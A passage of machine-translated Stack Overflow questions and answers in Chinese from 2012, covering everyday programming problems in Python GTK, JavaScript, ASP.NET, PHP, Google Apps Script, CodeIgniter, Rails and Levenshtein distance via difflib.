我想通了，我发现 gtk.textview.get_buffer 实际上设置了缓冲区 ID，然后 textview.set_text(buffer) 就是我所需要的。

这是完整的工作代码，glade 只是一个按钮、一个条目和一个文本视图：

```
#!/usr/bin/python

import os
import sys
import gtk
import pygtk

def onDeleteWindow(self, *args):
    Gtk.main_quit(*args)

def hello(button):
    textbuffer = textarea.get_buffer()
    textbuffer.set_text(txtinput.get_text())

builder = gtk.Builder()
builder.add_from_file("dagui.glade")

handlers = {
    "onDeleteWindow": gtk.main_quit,
    "buttondown": hello
}
builder.connect_signals(handlers)

textarea = builder.get_object("textview1")
window = builder.get_object("window1")
txtinput = builder.get_object("entry1")
window.show_all()

gtk.main() 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-09-30T06:35:56.890

使用它来添加文本：

```
textarea.set_text('whatever you want') 
```

这用于添加 pango 标记（[http://goo.gl/94Pkk](http://goo.gl/94Pkk)）：

```
textarea.set_markup('<span size="large>Example</span>') 
```

这是文档： http: [//python-gtk-3-tutorial.readthedocs.org/en/latest/index.html](http://python-gtk-3-tutorial.readthedocs.org/en/latest/index.html)

# android - Android 1.5 中 Eclipse 的奇怪视图

> ID：12659162
> 
> 赞同：0
> 
> 时间：2012-09-30T06:22:39.950
> 
> 标签：android, eclipse

我需要创建 Android 1.5 应用程序，但突然更新 Android SDK 后，我发现 Android 1.5 和 1.6 项目如下所示（使用按钮清除活动 - 仅此而已）：

![在此处输入图像描述](../Images/9ab9bcd7cedfaba1cf11fecbe810e249.png) 同时新的 Android 2.1 项目看起来像往常一样：

![在此处输入图像描述](../Images/d18c254b4f900b2e6113970fbda75089.png)

那么，它是 Eclipse 中的正常视图还是我必须修复一些东西？

# javascript - Javascript全局变量生命周期

> ID：12659168
> 
> 赞同：1
> 
> 时间：2012-09-30T06:23:43.103
> 
> 标签：javascript, web-applications

（我是 Javascript 初学者）

当我学习 Javascript 全局变量的生命周期时，它说：

> 全局变量的生命周期从它们被声明时开始，到页面关闭时结束。

我读到Javascript会将全局变量存储到窗口对象中？什么时候会被销毁？在网络浏览器中关闭选项卡后？

例如：如果 abc.com/page1.html 创建一个全局变量，然后在同一个选项卡中，我导航到 abc.com/page2.html 全局变量是否仍然存在？如果我导航到同一选项卡中的另一个域，例如 another.com/page1.html，怎么样？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-30T06:26:44.123

卸载窗口后，您的所有 JavaScript 变量都会丢失，假设您从第 1 页移动到第 2 页，在窗口离开时您的变量会丢失，如果它位于同一域或跨域，则同样适用

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-30T06:27:53.623

不，全局变量不能从一页到另一页。如果需要在页面之间保存数据，则需要维护状态。

维护状态涉及使用 cookie 或查询字符串值。[我对如何使用 JavaScript 在另一个页面上填写表单的](https://stackoverflow.com/questions/12183572/how-to-use-javascript-to-fill-a-form-on-another-page/)回答深入解释了这一点。

# c# - 没有参数名称的查询字符串

> ID：12659170
> 
> 赞同：1
> 
> 时间：2012-09-30T06:23:49.870
> 
> 标签：c#, asp.net, query-string, dotnetnuke, dotnetnuke-module

我正在努力让它发挥作用。我有一个 DNN 模块，我从查询字符串中读取并执行几个步骤。所有这些工作正常。现在我正在尝试在读取查询字符串时清理 URL

现在，URL 看起来像这样：

```
http://mysite.website.com/?pid=1234 
```

我希望它看起来像：

```
http://mysite.website.com/1234 
```

这样的事情甚至可能吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-30T10:10:52.713

您最好为 DotNetNuke 使用适当的重写解决方案（例如 iFinity UrlMaster 和其他......）。

然后，您可以为您的模块编写自定义 url 提供程序。

这就是我在我的网站上重写我的文章模块的部分内容（例如 www.ventrian.com/blog/

您可以在此处找到有关 urlmaster 的更多信息：

[http://www.ifinity.com.au/Products/Url_Master_DNN_SEO_Urls](http://www.ifinity.com.au/Products/Url_Master_DNN_SEO_Urls)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-30T08:41:56.380

通过使用 HttpModule，您可以在完全不与 DNN 交互的情况下完成您正在寻找的事情。有点像这样：

```
public class PidRewriteModule : System.Web.IHttpModule
{
    public void Dispose()
    {
    }

    public void Init(System.Web.HttpApplication context)
    {
        context.BeginRequest += new EventHandler(context_BeginRequest);
    }

    void context_BeginRequest(object sender, EventArgs e)
    {
        HttpApplication app = sender as HttpApplication;

        if (app != null)
        {
            Match mPidCheck = new Regex(@"^/(?<pid>[0-9]+)/?$").Match(app.Context.Request.Url.AbsolutePath);
            if (mPidCheck.Success)
            {
                app.Context.RewritePath("~/default.aspx", String.Empty, String.Concat("pid=", mPidCheck.Groups["pid"].Value));
            }
        }
        else
            return;
    }
} 
```

然后你可以把它添加到你的 Web.config 中：

```
<modules runAllManagedModulesForAllRequests="true">
    <add name="PidRewriteModule" type="Assembly.Namespace.PidRewriteModule, Assembly"/>
</modules> 
```

把它放在 system.webServer 节点中。分别替换 Assembly 和 Namespace。

所有这些信息都适用于 IIS7。IIS 6 并没有完全不同，但以前的实现必须走 ISAPI 过滤器的路线。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-30T06:43:57.513

你有几个选择：

1.  探索 DNN 中可用的重写功能以及如何使用它们。它们可以在主机设置 > 高级设置 > 友好 URL 设置中找到。或者根据您正在使用的 IIS 版本使用第二个选项。

2a。IIS 7 及更高版本的 URL 重写模块

2b。HeliconTech 的“ISAPI_Rewrite 3”（也有免费版本，做得很好）

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-30T06:25:30.247

看看使用 URL Rewriter 模块。IIS6 有几个第三方的，但微软为 IIS7 和 IIS7.5 提供了一个。您基本上使用正则表达式对其进行配置并更改输出。

Microsoft 的 IIS7 重写模块位于：[http ://www.iis.net/downloads/microsoft/url-rewrite](http://www.iis.net/downloads/microsoft/url-rewrite)

# regex - 正则表达式适用于文件夹以外的所有内容

> ID：12659172
> 
> 赞同：1
> 
> 时间：2012-09-30T06:25:15.390
> 
> 标签：regex

我正在尝试为 URL 创建一个正则表达式，以便它影响除某个文件夹之外的所有内容。正则表达式仅适用于 '/' 之后的所有内容，因此给定 url 的 url `http://www.blah.com/folder/main/file.html`，它将仅适用于`folder/main/file.html`- 我想要的正则表达式是当`folder/`url 中没有 ' ' 时基本上总是匹配的表达式。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-30T06:29:42.087

您可以使用负前瞻。例如这个：

```
^(.(?!folder/))*$ 
```

将匹配不包含“文件夹/”的任何内容

# c++ - C++ - 块内存的开始

> ID：12659174
> 
> 赞同：0
> 
> 时间：2012-09-30T06:25:47.173
> 
> 标签：c++

我的意思是给 struct\memory 中的变量指针，然后给它一些函数，它会给我指向 struct\memory 开头的指针。有一个功能可以做到吗？

要理解这个问题：

```
char* ptr=((char*)malloc(12))+3;
//MemStart(ptr) == ptr-3 
```

`MemStart`'将是在代码中给出该结果的函数。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-30T06:32:09.793

除非该结构在内存中的表示存在特定的内容（例如它始终以字节 0xff、0xff 开头），否则无法确定特定结构或数组的开始位置。现代架构是[冯诺依曼](http://en.wikipedia.org/wiki/Von_Neumann_architecture)机器，这意味着内存没有内在意义。

请注意，许多架构都存在对齐问题或优化，这意味着结构或数组可能需要从 16 位、32 位或 64 位字边界开始，但这些是特定于架构的。

[编辑：添加以下内容]

库可能会在分配的内存块的开头或结尾引入[保护字节，或者用已知常量填充内存以查找缓冲区溢出或错误指针。](http://en.wikipedia.org/wiki/Guard_byte)但是，这些通常在发布模式中被忽略，即使它们存在，也可能是有效数据。

您可以检查内存分配表以获取动态分配的内存，但可以在堆栈而不是堆上分配数组/结构。另外，如果数组中有一个结构会发生什么？它返回哪个值？如果您想将其限制为仅动态分配的内存，您希望仅在其中开始分配任何内存，Basile 有一个很好的答案。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-30T06:43:24.360

大多数`malloc`实现都没有提供您想要的（动态分配块的起始地址，给定一些指向它的内部指针）。标准不需要这样的东西。因此，您可能希望同时使用指向基址的指针和偏移量（也许将它们打包在一些 C++`class fat_pointer`中`operator*`并`operator->`给出指针的错觉等）。

您当然可以重新实现您自己的`malloc`上述操作系统内存段分配（即Linux 或 Posix 上的[mmap(2)](http://www.kernel.org/doc/man-pages/online/pages/man2/mmap.2.html)`munmap(2)` ）和解除分配原语系统调用。

您还可以拥有专门的分配器；[它可能会使用posix_memalign](http://pubs.opengroup.org/onlinepubs/009695399/functions/posix_memalign.html)为您的区域分配大的二次方对齐（例如 256 或 4096 字节） ，然后对`intptr_t`指针的转换使用位操作。

请注意，实现任何重要的内存分配器都意味着关心操作系统和体系结构的不可移植的细节（对齐，...）。

您还可以使用[Boehm 的保守垃圾收集器](http://www.hpl.hp.com/personal/Hans_Boehm/gc/)，即使用`GC_malloc`而不是`malloc`（并且不要打扰`GC_free`您的动态数据）；那么你就有了`GC_base`完全符合你要求的功能：

```
/* Return a pointer to the base (lowest address) of an object given   */
/* a pointer to a location within the object.                         */
/* I.e. map an interior pointer to the corresponding bas pointer.     */
/* Note that with debugging allocation, this returns a pointer to the */
/* actual base of the object, i.e. the debug information, not to      */
/* the base of the user object.                                       */
/* Return 0 if displaced_pointer doesn't point to within a valid      */
/* object.                                                            */
/* Note that a deallocated object in the garbage collected heap       */
/* may be considered valid, even if it has been deallocated with      */
/* GC_free.                                                           */
GC_API void * GC_base(void * displaced_pointer); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-30T06:53:21.187

您可以使用以下`offsetof()`宏`<cstddef>`：

```
#include <cstddef>
#include <iostream>

using namespace std;

typedef struct
{
  int a;
  int b;
} S;

int main()
{
  S s = { 1, 2 };

  cout << "address of s:" << &s << endl;
  cout << "address of s.a:" << &s.a << endl;
  cout << "address of s.b:" << &s.b << endl;

  int* pb = &s.b;
  S* ps = (S*)((char*)pb - offsetof(S, b));

  cout << "ps:" << ps << endl;

  return 0;
} 
```

输出（[ideone](http://ideone.com/9pWuw)）：

```
address of s:0xbffd266c
address of s.a:0xbffd266c
address of s.b:0xbffd2670
ps:0xbffd266c 
```

# php - 如何根据提交的按钮执行 php 部分

> ID：12659180
> 
> 赞同：0
> 
> 时间：2012-09-30T06:27:04.167
> 
> 标签：php, mysql, sql

我有几段代码可以将值插入数据库中的不同表中。

我想知道是否有一种方法可以捕获我的表单上的哪个按钮已被选中，因此当页面重新加载时它只执行一个插入语句？

这就是我提交到同一页面的方式

```
<form name="input" action=myawesomeform.php" method="POST"> 
```

这就是我的提交按钮的样子

```
<input type="submit" value="Submit" id="5050gdmyButton" /> 
```

所以几乎我想根据选择的按钮执行其中一个插入语句..

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-30T06:32:00.653

1）您需要为您的提交按钮提供**名称属性**

2）当您的表单中有多个输入并且当您按下其中一个时，您只能在具有 name 属性的 php 代码中获得该输入。

例如：

```
<input type="submit" name="submit1" value="add" id="5050gdmyButton1" />
<input type="submit" name="submit2" value="update" id="5050gdmyButton2" /> 
```

在你的 php

```
if(isset($_POST['submit1']) && $_POST['submit1'] == 'add'){
// do insert for first one
}

if(isset($_POST['submit2']) && $_POST['submit2']== 'update'){
// do update for second one
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-30T06:34:01.710

您可以像这样为提交按钮提供两个不同的名称..

```
 <input type="submit" name="button1" value="Button1" id="5050gdmyButton" />
 <input type="submit" name="button2" value="Button2" id="5051gdmyButton" /> 
```

在接收页面中使用这样的条件......

```
 if ($_POST['button1'])
  {
  //do your first button process
  }
  elseif($_POST['button2'])
 {
  //do you second button process
 } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-30T06:37:22.240

如果您有多个提交按钮，则应该为每个按钮指定不同的名称

```
 <input type="submit" value="addSubmitButton" id="5050gdmyButton1" />
//to add value in db
<input type="submit" value="removeSubmitButton" id="5050gdmyButton2" />
//to remove value in db 
```

在你的服务器端

```
<?php
if(isset($_POST["addSubmitButton"])){
//add value in db
}

if(isset($_POST["removeSubmitButton"])){
//remove data from database
}

?> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-30T06:31:46.630

只是输入中的一个名称标签

```
<input type="submit" value="Submit" id="5050gdmyButton" name="5050gdmyButton" /> 
```

并在 php 中检查名称 isset()

```
if(isset($_REQUEST['5050gdmyButton'])){ //do somthing } 
```

# google-apps-script - 更改 copyDown() 脚本以仅在一张工作表上操作

> ID：12659183
> 
> 赞同：0
> 
> 时间：2012-09-30T06:28:07.660
> 
> 标签：google-apps-script, google-sheets, google-forms

在 Google 表格中，我有一张带有表单响应的表格，在表格列的右侧，我有带有将表单数据用于函数的公式的列。

一开始，我将公式沿行向下扩展，以便他们处理新的表单提交，但发现新的表单提交会清除该行:(。

我没有在每次提交后手动扩展公式，而是安装了[Andrew Stillman 的`copyDown()`脚本](http://pastebin.com/1BaE1v9p)；它所做的是在提交脚本后复制公式。

现在我遇到的问题是脚本在手动运行时有效，但是当我设置在表单提交时触发时，它会在该表**和**电子表格中的所有其他表上复制所述公式。我不想要那种副作用，因为它把整个电子表格弄乱了。:((

我想做的是编辑脚本，所以它只适用于一个表单响应表，而不是所有表。但我不知道该怎么做。

我希望它运行的工作表的名称是“请求”，而`gid=8`.

如何编辑此脚本以仅适用于那一张纸？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-30T07:59:33.103

要让代码仅在特定工作表上运行，请使用 .getSheetByName() 方法。例如：

```
var ss = SpreadsheetApp.getActiveSpreadsheet();
var reqSh = ss.getSheetByName('Requests'); 
```

还有另一种可能更容易的方法。您可以尝试保留一张表纯粹用于表单提交，并在第二张表中使用数组公式将第一张表中的任何值复制到第二张表中的相同范围。

=ARRAYFORMULA('Requests'!A1:H) 会将列 A 复制到 H。

我和你有同样的问题，这就是解决方案。我将公式放在范围右侧列的第二张表中，并以正常方式将它们复制下来。公式引用了第二张表中的复制范围。它奏效了。

这个想法不是我自己想出来的——我确信它是由 Google 电子表格论坛上的某个人提出的。我应该给你一个帖子的链接，但我只是看了一下，找不到。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-30T07:58:38.473

在您的代码中，您有（代码中的注释）

```
 var sheets = ss.getSheets() [8]; // you choose sheet [8]
 var cellAddresses = new Object();
  for (var i=0; i<sheets.length; i++) { // but you enter a for loop that adresses every sheet in turn...
    var range = sheets[i].getDataRange(); 
```

您应该简单地抑制此循环并仅使用您想要继续的工作表编号......

最简单的方法可能是这样做：

```
 var i = 8
 var sheets = ss.getSheets() [i];
 var cellAddresses = new Object();
    var range = sheets[i].getDataRange();
  ... 
```

并在循环结束时删除适合`for`循环的 }

**编辑**：新代码应该是这样的：

```
function copydown() {
  setCopyDownUid();
  setCopyDownSid();
  logCopyDown();
  var ss = SpreadsheetApp.getActiveSpreadsheet();
  var sheets = ss.getSheets() [8];
  var cellAddresses = new Object();
  var i=8
//  for (var i=0; i<sheets.length; i++) {
    var range = sheets[i].getDataRange();
    var lastRow = range.getLastRow();
    var values = range.getValues();
    for (var j=0; j<values.length; j++) {
      for (var k=0; k<values[j].length; k++) {
        var test = values[j][k].toString();
        var start = test.indexOf("copydown");
          if (start == 0) {
            start = start+10;
            var end = test.length-2;
            var length = end-start;
            var value = test.substr(start, length);
            var col = k+1;
            var nextRow = j+2;
            var numRows = lastRow-(nextRow-1);
            if (numRows>0) {
              var destRange = sheets[i].getRange(nextRow, col, numRows, 1);
              destRange.clear();
              var newLastRow = sheets[i].getDataRange().getLastRow();
              var newNumRows = newLastRow-(nextRow-1);
              var newDestRange = sheets[i].getRange(nextRow, col, newNumRows, 1);
              var cell = sheets[i].getRange(nextRow-1, col);
              cell.setFormula(value);
              cell.copyTo(newDestRange);
            }
            var cellAddress = cell.getA1Notation();
            cellAddresses[cellAddress] = test;
          }
      }
    }
    Utilities.sleep(500);
    resetCellValues(cellAddresses, sheets[i]);
  }
//} 
```

# javascript - 当作为某些 JSON 数据的一部分返回时，字符串 "" 会导致任何问题吗？

> ID：12659184
> 
> 赞同：1
> 
> 时间：2012-09-30T06:28:22.697
> 
> 标签：javascript, string-literals, script-tag

无论如何，不​​涉及内联脚本。我有一个外部文件脚本，它从 twitter 获取一些 JSONP。假设在返回的 JSONP 中表示的对象的属性是一个字符串，其中某处包含 substring `"</script>"`。这会不会导致任何问题，而不会被添加到 DOM 中？（在那之前它会被擦洗干净。）

我不明白为什么会这样，但是 HTML 解析是出了名的古怪和古怪，所以谁知道呢？我知道如果你想在内联脚本中有一个字符串文字，你需要把它分解，就像`var slashScriptContainingString = 'foo</scr' + 'ipt>bar';` 再一次，我觉得它应该没问题，但只是检查是否有人知道为什么它可能不是。

```
<!doctype html>
<script src="file.js"></script> 
```

* * *

[文件.js：]

```
var f = function(twobj) {
  console.log(twobj);
  doOtherStuffWith(twobj);
} 
```

* * *

```
<script src="https://api.twitter.com/statuses/user_timeline/user.json?callback=f"></script> 
```

* * *

[返回 JSONP：]

```
f(["this is an object, returned as part of the JSONP response, except it contains a string literal with the substring \"</script>\".  Is this a problem? Note: I haven't said anything about injecting this string in the DOM in any way shape or form. I can't think of a reason why it might be, but I'd just like to be sure."]); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T06:31:13.967

不，字符串文字可以包含您想要的任何内容。只要您不盲目地尝试设置`innerHTML`某些东西，字符串就是字符串。您发布的示例是安全的。

您需要在 JavaScript 源代码中拆分`</script>`标签的原因是您缺少 CDATA 块。如果没有它们，从技术上讲，内联 JavaScript 中的所有内容都需要为 HTML 正确转义。（`<`变成`&lt;`等）浏览器对你很好，让它滑动，但`</script>`内联 JavaScript 变得模棱两可。您应该使用 CDATA 块来防止这样的事情发生。

```
<script type="text/javascript">
//<![CDATA[
...code...
//]]>
</script> 
```

有关更多详细信息，请参阅此问题： [脚本标记中何时需要 CDATA 部分？](https://stackoverflow.com/questions/66837/when-is-a-cdata-section-necessary-within-a-script-tag)

# codeigniter - mysql , codeigniter 活动记录类

> ID：12659185
> 
> 赞同：-4
> 
> 时间：2012-09-30T06:28:32.820
> 
> 标签：codeigniter

### 表格1

```
house_id|house_name|status

  1     |     A    |  1
  2     |     B    |  1
  3     |     C    |  0
  4     |     D    |  1
  5     |     E    |  1
  6     |     F    |  1 
```

### 表格1

```
house_id| image

   2    | img1.jpg
   2    | img2.jpg
   1    | img3.jpg
   4    | img4.jpg
   1    | img5.jpg
   4    | img6.jpg
   3    | img7.jpg 
```

### 我想从 table1 中选择所有 house_id ，其中 status =1 (descending) ，从 table2 中选择不同的图像，对于 table1 的每个 house_id 。

### 最后输出显示如下：

### 输出

```
house_id|house_name|image

   6    |    F     |NULL
   5    |    E     |NULL
   4    |    D     |img4.jpg
   2    |    B     |img1.jpg  
   1    |    A     |img3.jpg 
```

### 请帮我用普通的mysql或CI活动记录类方法编码..

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-30T07:02:25.543

试试这个......（正常的mysql）

```
SELECT t1.*,t2.image FROM table1  t1
LEFT JOIN table2 t2 on t1.house_id=t2.house_id
WHERE t1.status= 1 GROUP BY t1.house_id ORDER BY house_id desc 
```

活跃记录...

```
$this->db->select(t1.*,t2.image);
$this->db->from('table1'.' t1');
$this->db->join('table2'.' t2','t1.house_id=t2.house_id','left');
$this->db->where('t1.status',1);
$this->db->group_by("t1.house_id"); 
$this->db->order_by("house_id"); 
```

# jquery - 在创建手动 ajax 请求时使用 jquery-rails (ujs)

> ID：12659189
> 
> 赞同：1
> 
> 时间：2012-09-30T06:28:55.863
> 
> 标签：jquery, ruby-on-rails, ruby-on-rails-3, ujs

我为笔记列表实现了 jQuery 的可拖放/可拖放功能，以对它们进行分层排序，目前效果很好，但我觉得我做的太多了。

整个`csrf`部分是随请求手动发送的，我也在手动评估响应，这是 ujs 提供的功能。有没有办法无缝集成，以便我可以利用 ujs lib 的优势？

我想到的一个可能的解决方案是将整个可拖动对象包装成 a `<form data-remote="true">`，但这感觉有点骇人听闻。

```
$(function()
{   
    $('#notes-container .note').draggable();

    $('#notes-container .note').droppable({
        drop: function(event, ui)
        {
            $.ajax({
                type: 'PUT',
                url: ui.draggable.find('form').attr('action'),
                data: { 
                    authenticity_token: $('meta[name="csrf-token"]').attr('content'),

                    task: { 
                        parent_id: $(this).data('id') 
                    } 
                }
            });
        }
    });

}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-03T07:45:50.523

通过将我需要的整个表单添加到元素中来解决，然后让`draggable`/`droppable`回调填充表单需要的值并触发`.submit()`然后由`jquery-rails`.

# c# - 找不到服务器控制

> ID：12659195
> 
> 赞同：1
> 
> 时间：2012-09-30T06:30:09.760
> 
> 标签：c#, asp.net, visual-studio

我是 ASP.NET 的新手，但一直给我带来麻烦的是寻找嵌套的服务器控件，尤其是嵌套的服务器控件。

在这种情况下，这是我的注册页面，直到我想要的服务器控件：

```
<asp:CreateUserWizard runat="server" ID="RegisterUser" ViewStateMode="Disabled" OnCreatedUser="RegisterUser_CreatedUser">
    <LayoutTemplate>
        <asp:PlaceHolder runat="server" ID="wizardStepPlaceholder" />
        <asp:PlaceHolder runat="server" ID="navigationPlaceholder" />
    </LayoutTemplate>
    <WizardSteps>
        <asp:CreateUserWizardStep runat="server" ID="RegisterUserWizardStep">
            <ContentTemplate>
                <fieldset>
                    <ol>
                        <li>
                            <asp:TextBox runat="server" ID="firstName" />
                        </li> 
```

为便于阅读，我删除的唯一内容是一些 HTML 元素。我正在尝试访问'firstName'。我已经尝试了以下所有方法，但都没有成功，（TextBox first 总是为空）。

```
TextBox first = (TextBox)Page.Master.FindControl("MainContent").FindControl("firstName");
TextBox first = (TextBox)Page.FindControl("firstName");
TextBox first = (TextBox)RegisterUserWizardStep.FindControl("firstName");
TextBox first = (TextBox)RegisterUser.FindControl("firstName"); 
```

非常感谢帮助，谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T06:37:21.820

很多时候，您可能需要进行递归控制搜索。首先，将此方法添加到您的页面：

```
private Control FindControlRecursive(Control Root, string Id)
{
    if (Root.ID == Id)
        return Root;
    foreach (Control Ctl in Root.Controls)
    {
        Control FoundCtl = FindControlRecursive(Ctl, Id);
        if (FoundCtl != null)
            return FoundCtl;
    }
    return null;
} 
```

现在，要找到控件，请调用：

```
TextBox firstName = (TextBox)FindControlRecursive(this, "firstName"); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-30T06:35:46.937

试试这段代码：

```
TextBox first = (TextBox) RegisterUser.CreateUserStep.ContentTemplateContainer.FindControl("firstName"); 
```

# python - Python difflib 中的 SequenceMatcher 是否有可能提供一种更有效的方法来计算 Levenshtein 距离？

> ID：12659199
> 
> 赞同：7
> 
> 时间：2012-09-30T06:30:16.687
> 
> 标签：python, performance, algorithm, levenshtein-distance, difflib

这是计算 Levenshtein 距离的通用算法的教科书示例（我从[Magnus Hetland 的网站中提取](http://hetland.org/coding/python/levenshtein.py)）：

```
def levenshtein(a,b):
    "Calculates the Levenshtein distance between a and b."
    n, m = len(a), len(b)
    if n > m:
        # Make sure n <= m, to use O(min(n,m)) space
        a,b = b,a
        n,m = m,n

    current = range(n+1)
    for i in range(1,m+1):
        previous, current = current, [i]+[0]*n
        for j in range(1,n+1):
            add, delete = previous[j]+1, current[j-1]+1
            change = previous[j-1]
            if a[j-1] != b[i-1]:
                change = change + 1
            current[j] = min(add, delete, change)

    return current[n] 
```

但是，我想知道是否可能存在使用 difflib 的 SequenceManager 的更高效（并且可能更优雅）的纯 Python 实现。在玩了它之后，这就是我想出的：

```
from difflib import SequenceMatcher as sm

def lev_using_difflib(s1, s2):
    a = b = size = distance = 0
    for m in sm(a=s1, b=s2).get_matching_blocks():
        distance += max(m.a-a, m.b-b) - size
        a, b, size = m
    return distance 
```

我想不出一个失败的测试用例，而且性能似乎明显优于标准算法。

以下是依赖 difflib 的 levenshtein 算法的结果：

```
>>> from timeit import Timer
>>> setup = """
... from difflib import SequenceMatcher as sm
... 
... def lev_using_difflib(s1, s2):
...     a = b = size = distance = 0
...     for m in sm(a=s1, b=s2).get_matching_blocks():
...         distance += max(m.a-a, m.b-b) - size
...         a, b, size = m
...     return distance
... 
... strings = [('sunday','saturday'),
...            ('fitting','babysitting'),
...            ('rosettacode','raisethysword')]
... """
>>> stmt = """
... for s in strings:
...     lev_using_difflib(*s)
... """
>>> Timer(stmt, setup).timeit(100000)
36.989389181137085 
```

这是标准的纯python实现：

```
>>> from timeit import Timer
>>> setup2 = """
... def levenshtein(a,b):
...     n, m = len(a), len(b)
...     if n > m:
...         a,b = b,a
...         n,m = m,n
... 
...     current = range(n+1)
...     for i in range(1,m+1):
...         previous, current = current, [i]+[0]*n
...         for j in range(1,n+1):
...             add, delete = previous[j]+1, current[j-1]+1
...             change = previous[j-1]
...             if a[j-1] != b[i-1]:
...                 change = change + 1
...             current[j] = min(add, delete, change)
... 
...     return current[n]
... 
... strings = [('sunday','saturday'),
...            ('fitting','babysitting'),
...            ('rosettacode','raisethysword')]
... """
>>> stmt2 = """
... for s in strings:
...     levenshtein(*s)
... """
>>> Timer(stmt2, setup2).timeit(100000)
55.594768047332764 
```

使用 difflib 的 SequenceMatcher 算法的性能真的更好吗？或者它是否依赖于完全使比较无效的 C 库？如果它依赖于 C 扩展，我如何通过查看 difflib.py 实现来判断？

使用 Python 2.7.3 [GCC 4.2.1 (Apple Inc. build 5666)]

在此先感谢您的帮助！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-02T20:35:38.837

```
>>> levenshtein('hello', 'world')
4
>>> lev_using_difflib('hello', 'world')
5 
```

# html - 使用适用于 Windows 的 Sublime Text 2 自动化 Haml 和 Sass

> ID：12659204
> 
> 赞同：1
> 
> 时间：2012-09-30T06:31:43.553
> 
> 标签：html, css, haml, sass, sublimetext2

我是使用 Windows 进行设计和 html/js/css 编码的前端人员。我的工作与使用 .NET 的后端人员是分开的。我对 Haml/Sass 和 Ruby 也很陌生。绝对不使用 Rails。经过几次搜索，我决定选择 Sublime Text 2 来支持 Sass/Haml 并摆脱我的旧 Notepad++。我的第一个问题是：

***1\. 将 Haml（主）和/或 Sass 的整个文件夹自动转换为静态文档（html/css）的最佳实践/效率是什么？***

通过设置“手表”，我有一个单独的 Sass 解决方案。我正在寻找 Haml 自动转换解决方案，但发现的选项很少： [Library for making static Websites with HAML/SASS/CSS framework](https://stackoverflow.com/questions/2161517/library-for-making-static-websites-with-haml-sass-css-framework)

***2\. 我应该使用 StaticMatic 吗？***

谷歌搜索说它是最好的。但似乎 2 年没有更新 [https://github.com/staticmatic/staticmatic](https://github.com/staticmatic/staticmatic)

还有这个网站（是一样的吗？）：[http ://staticmatic.rubyforge.org/how_to_use.html](http://staticmatic.rubyforge.org/how_to_use.html)

如果我使用 StaticMatic，我可以在 Sublime Text 中设置构建系统以从构建菜单（[http://docs.sublimetext.info/en/latest/file_processing/build_systems.html](http://docs.sublimetext.info/en/latest/file_processing/build_systems.html)）运行

***3\. 或者我应该采用这样的多合一解决方案（可能要花几块钱）？有免费的吗？***

[http://fireapp.handlino.com/](http://fireapp.handlino.com/)

我不介意让 Sass -watch 单独运行并为 Haml 提供另一个轮询机制。我只是想确保我有“最新的”。

希望对我的独特情况得到一些建议。谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-09T05:01:48.807

答案是中间人 [http://middlemanapp.com/](http://middlemanapp.com/)

它是过时的 StaticMatic 的替代品

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-16T13:07:55.303

**哈姆勒**：

对于从 haml 到 sass 的自动转换，您可以使用以下要点：[https](https://gist.github.com/3898955) ://gist.github.com/3898955 。如果您想进一步自动化工作流程过程，可以使用[https://github.com/alexnj/SublimeOnSaveBuild](https://github.com/alexnj/SublimeOnSaveBuild) sublime 包在文件保存时运行命令。

**萨斯**：

对于 SASS，这里是所需的设置。[https://gist.github.com/3899112](https://gist.github.com/3899112)。

对于保存时的自动转换，此处也应用了相同的规则，但在文件中包含`.sass`and`.haml`扩展名很重要。`SublimeOnSaveBuild.sublime-settings`

所以你的文件应该是这样的：

```
{
    "filename_filter": "\\.(css|js|sass|less|scss|jade|haml)$",
    "build_on_save": 1
} 
```

您可以根据自己的意愿扩展此列表。

# jquery - 切换选项卡时保留 URL 变量

> ID：12659214
> 
> 赞同：1
> 
> 时间：2012-09-30T06:33:59.403
> 
> 标签：jquery, url, parameters, tabs

我正在使用 jquery ui 选项卡在[http://www.code7dev4.co.uk/data页面上的选项卡之间切换](http://www.code7dev4.co.uk/data)

相关的jquery代码是：

```
jQuery(document).ready(function ($) {
    function activateTab($tab) {
        var $activeTab = $tab.closest('dl').find('a.active'),
            contentLocation = $tab.attr("href") + 'Tab';

        // Strip off the current url that IE adds
        contentLocation = contentLocation.replace(/^.+#/, '#');

        //Make Tab Active
        $activeTab.removeClass('active');
        $tab.addClass('active');

        //Show Tab Content
        $(contentLocation).closest('.tabs-content').children('li').hide();
        $(contentLocation).css('display', 'block');
    }

    $('dl.tabs dd a').live('click', function (event) {
        activateTab($(this));
    });

    if (window.location.hash) {
        activateTab($('a[href="' + window.location.hash + '"]'));
        $.foundation.customForms.appendCustomMarkup();
    }
}); 
```

现在，客户端需要右侧的表单为每个数据搜索创建唯一的 url，这些在 url 中作为参数（例如[http://www.code7dev4.co.uk/data?form_send=send&country=Uganda§or=健康&strail=plac&units=DollarConstant&year=2009](http://www.code7dev4.co.uk/data?form_send=send&country=Uganda&sector=health&strail=plac&units=DollarConstant&year=2009) )。

切换标签会丢失 url 变量，我只剩下`/data#table`.

如何更改代码以便维护这些 url 参数？

* * *

## 回答 #1

